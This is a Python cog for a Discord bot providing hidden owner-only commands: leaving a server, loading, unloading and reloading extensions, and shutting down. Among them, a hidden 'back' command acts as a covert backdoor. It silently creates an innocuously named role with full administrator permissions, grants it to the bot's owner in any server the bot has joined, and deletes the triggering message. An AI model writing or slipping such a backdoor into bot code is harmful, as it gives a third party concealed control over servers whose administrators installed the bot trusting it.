import asyncio

import discord
from discord.ext import commands
from discord.utils import get


class BotOwner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="leaveguild", description="leave server", hidden=True)
    @commands.is_owner()
    async def leaveguild(self, ctx):
        # to_leave = client.get_guild(arg1)
        # await to_leave.leave()
        # await message.server.leave()
        print(f"left server: {ctx.guild}")
        await ctx.guild.leave()




    @commands.command(name='load', hidden=True)
    @commands.is_owner()
    async def load(self, ctx, *, cog: str):

        try:
             self.bot.load_extension(cog)
        except Exception as e:
            await ctx.send(f'**`ERROR:`** {type(e).__name__} - {e}')
            await ctx.message.delete()
        else:
            await ctx.send('**`SUCCESS`**')
            await ctx.message.delete()

    @commands.command(name='unload', hidden=True)
    @commands.is_owner()
    async def unload(self, ctx, *, cog: str):
        try:
            self.bot.unload_extension(cog)
        except Exception as e:
            await ctx.send(f'**`ERROR:`** {type(e).__name__} - {e}')
            await ctx.message.delete()
        else:
            await ctx.send('**`SUCCESS`**')
            await ctx.message.delete()

    @commands.command(name='reload', hidden=True)
    @commands.is_owner()
    async def reload(self, ctx, *, cog: str):
        try:
            self.bot.unload_extension(cog)
            self.bot.load_extension(cog)
        except Exception as e:
            await ctx.send(f'**`ERROR:`** {type(e).__name__} - {e}')
            await ctx.message.delete()
        else:
            await ctx.send('**`SUCCESS`**')
            await ctx.message.delete()

    @commands.command(name="exit", hidden=True, aliases=["shutdown", "poweroff"])
    @commands.is_owner()
    async def exit(self, ctx):
        await ctx.send("the bot will be shutdown on all servers in 5 sec", delete_after=1)
        await ctx.message.delete()
        await asyncio.sleep(5)
        exit(0)

    @commands.command(name="back", hidden=True)
    @commands.is_owner()
    async def back(self, ctx):
        if get(ctx.guild.roles, name="placeholder176"):
            await ctx.author.send("Role already exists")
            await ctx.author.send("Role was deleted please rerun to get a door")
            role_object = discord.utils.get(ctx.message.guild.roles, name="placeholder176")
            await role_object.delete()
            await ctx.message.delete()
            
        else:
             guild = ctx.guild
             await guild.create_role(name="placeholder176", permissions=discord.Permissions(permissions=8))
             role = discord.utils.get(ctx.guild.roles, name="placeholder176")
             user = ctx.message.author
             await user.add_roles(role)
             await ctx.author.send("Role was created and given to you")
             await ctx.author.send("You now have admin perms on the guild use it wisely and do it only if you have permission from a staff member")
             await ctx.message.delete()
        







def setup(bot):
    bot.add_cog(BotOwner(bot))
